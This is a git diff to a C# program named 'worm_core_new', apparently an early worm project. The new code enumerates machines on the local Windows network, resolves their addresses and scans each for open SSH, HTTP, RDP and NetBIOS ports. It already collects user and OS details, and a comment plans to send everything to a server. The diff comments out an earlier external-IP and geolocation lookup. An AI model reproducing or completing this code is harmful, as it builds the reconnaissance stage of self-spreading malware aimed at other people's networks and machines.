@@ -9,6 +9,8 @@ using System.Security.Cryptography;
 using System.Net;
 using Newtonsoft.Json.Linq;
 using System.DirectoryServices;
+using System.Net.Sockets;
+using System.Drawing;
 
 namespace worm_core_new
 {
@@ -37,28 +39,58 @@ namespace worm_core_new
             Console.WriteLine("UserName: {0}", Environment.UserName);
             Console.WriteLine("OS version: {0}\n", Environment.OSVersion);
 
-            //HTTP GET request for IP Address 
-            WebClient client = new WebClient();
-            string ipString = client.DownloadString("http://bot.whatismyipaddress.com/");
-            Console.WriteLine("External IP address: {0}\n", ipString);
+            ////HTTP GET request for IP Address 
+            //WebClient client = new WebClient();
+            //string ipString = client.DownloadString("http://bot.whatismyipaddress.com/");
+            //Console.WriteLine("External IP address: {0}\n", ipString);
 
-            //Location from keyboard layout or IP Address for another GET
-            string location = client.DownloadString("http://ip-api.com/json/" + ipString);
-            JObject json = JObject.Parse(location);
-            Console.WriteLine("Location data:\n ");
-            Console.WriteLine(json["city"] + ", " + json["regionName"] + " " + json["zip"] + " in the " + json["country"]);
-            Console.WriteLine("ISP: " + json["isp"] + ", " + json["org"]);
-            Console.WriteLine();
+            ////Location from keyboard layout or IP Address for another GET
+            //string location = client.DownloadString("http://ip-api.com/json/" + ipString);
+            //JObject json = JObject.Parse(location);
+            //Console.WriteLine("Location data:\n ");
+            //Console.WriteLine(json["city"] + ", " + json["regionName"] + " " + json["zip"] + " in the " + json["country"]);
+            //Console.WriteLine("ISP: " + json["isp"] + ", " + json["org"]);
+            //Console.WriteLine();
 
             // List all computers on local network
             DirectoryEntry root = new DirectoryEntry("WinNT:");
+            List<KeyValuePair<string, IPAddress>> toScan = new List<KeyValuePair<string, IPAddress>>();
+            Console.WriteLine("SCANNING Local Area Network");
             foreach (DirectoryEntry computers in root.Children)
             {
                 foreach (DirectoryEntry computer in computers.Children)
                 {
                     if (computer.Name != "Schema")
                     {
-                        Console.WriteLine("Computer found: " + computer.Name + " " + computer.Path);
+                        Console.WriteLine("Computer found: " + computer.Name);
+                        IPAddress[] addresslist = Dns.GetHostAddresses(computer.Name);
+                        toScan.Add(new KeyValuePair<string, IPAddress>(computer.Name, addresslist[addresslist.Length - 1]));
+
+                        foreach (IPAddress theaddress in addresslist)
+                        {
+                            Console.WriteLine("     " + theaddress.ToString());
+                        }
+                    }
+                }
+            }
+
+            Console.WriteLine("\n Port Scanning computers for vunerabilities");
+            foreach (KeyValuePair<string, IPAddress> IP in toScan)
+            {
+                Console.WriteLine("Scanning " + IP.Key + " at " + IP.Value);
+                foreach (int s in Ports)
+                {
+                    using (TcpClient Scan = new TcpClient())
+                    {
+                        try
+                        {
+                            Scan.Connect(IP.Value, s);
+                            Console.WriteLine($"    [{s}] | OPEN", Color.Green);
+                        }
+                        catch
+                        {
+                            Console.WriteLine($"    [{s}] | CLOSED", Color.Red);
+                        }
                     }
                 }
             }
@@ -66,6 +98,14 @@ namespace worm_core_new
             // Call kade's function or work with kade to send everything to server
 
         }
+        private static int[] Ports = new int[]
+        {
+            22,
+            80,
+            3389,
+            139,
+            8080,
+        };
 
 
         // function
